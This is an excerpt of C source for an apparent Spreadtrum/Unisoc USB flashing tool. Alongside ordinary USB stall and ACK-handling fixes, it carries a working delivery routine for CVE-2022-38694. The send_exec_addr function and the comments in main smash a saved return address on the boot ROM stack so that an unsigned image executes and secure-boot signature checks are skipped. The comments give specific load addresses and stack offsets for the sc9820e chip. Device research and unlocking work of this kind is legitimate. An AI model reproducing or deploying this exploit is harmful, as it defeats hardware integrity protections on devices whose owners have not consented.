	...
	for (;;) {
		if (pos >= len) {
			...
			if (err == LIBUSB_ERROR_NO_DEVICE)
				...
				/* FIX: the bulk IN endpoint stalls at the end of a large
				 * partition write. Upstream has no stall recovery anywhere, so
				 * a 10MB write could never complete: the endpoint halts, every
				 * later transfer fails, and END_DATA never commits. USB defines
				 * CLEAR_FEATURE(ENDPOINT_HALT) for exactly this - clear it and
				 * retry rather than aborting. */
				DBG_LOG("endpoint stalled, clearing halt and retrying\n");
				libusb_clear_halt(io->dev_handle, io->endp_in);
				libusb_clear_halt(io->dev_handle, io->endp_out);
				continue;
			}
			else if (err < 0)
...
/* CVE-2022-38694 delivery.
 *
 * Identical to send_buf() except that the data chunks are NOT acknowledged.
 * The payload overwrites the saved return address that the boot ROM's own
 * j__memcpy() is about to pop, so the moment the copy completes the ROM
 * branches to our image instead of returning to its command loop. It therefore
 * never sends the ACK, and send_and_check() would abort on a timeout that
 * actually means the exploit worked. START_DATA is still checked normally -
 * that reply comes back before anything is overwritten. */
static void send_exec_addr(spdio_t *io, const char *fn,
		uint32_t start_addr, unsigned step) {
	uint8_t *mem; size_t size = 0;
	uint32_t data[2], i, n;

	mem = loadfile(fn, &size, 0);
	if (!mem) ERR_EXIT("loadfile(\"%s\") failed\n", fn);
	if (!size) ERR_EXIT("empty exec_addr payload\n");

	WRITE32_BE(data, start_addr);
	WRITE32_BE(data + 1, (uint32_t)size);
	encode_msg(io, BSL_CMD_START_DATA, data, 4 * 2);
	send_and_check(io);
	...
	for (i = 0; i < size; i += n) {
		...
		encode_msg(io, BSL_CMD_MIDST_DATA, mem + i, n);
		send_msg(io);
		/* Best effort: a reply means the ROM is still in its loop, no reply
		 * means it has already jumped. Either way we carry on to the FDL1
		 * handshake, which is what actually tells us whether it worked. */
		recv_msg_timeout(io, 500);
	}
	free(mem);
}
...
static void load_partition(spdio_t *io, const char *name,
	...
	for (offset = 0; (n64 = len - offset); offset += n) {
		...
		send_msg(io);
		/* FIX: the return value was discarded here, so a missing ACK went
		 * undetected. recv_type() then re-read the PREVIOUS reply still in
		 * io->raw_buf, so the loop kept sending data the device was no
		 * longer accepting - making "written:" count bytes SENT rather than
		 * bytes acknowledged, and leaving END_DATA to fail on a desynced
		 * link. Line ~1346 does this correctly. */
...
int main(int argc, char **argv) {
	...
	int secure_boot = 0;
	/* CVE-2022-38694. Rather than asking the boot ROM to EXEC the image we just
	 * uploaded - which is exactly where it verifies the signature - overwrite a
	 * saved return address on the ROM's own stack with the load address. When
	 * that ROM function returns it lands in our image, having never verified it.
	 * exec_file holds the 8-byte little-endian target (0x5200 on sc9820e, i.e.
	 * fdl1 base 0x5000 + the 0x200 DHTB header) and exec_addr is the stack slot
	 * to smash (0x4ee8 = j__memcpy's saved LR, 0x4f18 = cmd_recv_data_usb's).
	 * The write must go out withOUT END_DATA, so the ROM never leaves its
	 * receive loop through the normal path. */
	unsigned exec_addr = 0; const char *exec_file = NULL;
	...
	while (argc > 1) {
		if (!strcmp(argv[1], "fdl")) {
			...
			if (!fdl_loaded) {
				...
				if (exec_addr) {
					/* CVE-2022-38694: smash the ROM's saved return address
					 * instead of issuing EXEC_DATA. No END_DATA here - the
					 * ROM must return through the corrupted frame. */
					DBG_LOG("exec_addr: writing %s to 0x%x (no EXEC_DATA)\n",
							exec_file, exec_addr);
					send_exec_addr(io, exec_file, exec_addr,
						blk_size ? blk_size : 528);
				} else if (t117_exec_dist) {
...
#define CHECK_SECURE \
	if (~fw_addr && secure_boot) \
		if ((uint32_t)(addr - fw_addr) < 0x10000) \
			...
			/* exec_addr <stack_addr> <file>   (boot ROM stage only)
			 * Must appear BEFORE the fdl command it applies to. */
			if (argc <= 3) ERR_EXIT("bad command\n");
			exec_addr = strtoul(argv[2], NULL, 0);
			exec_file = argv[3];
			argc -= 3; argv += 3;
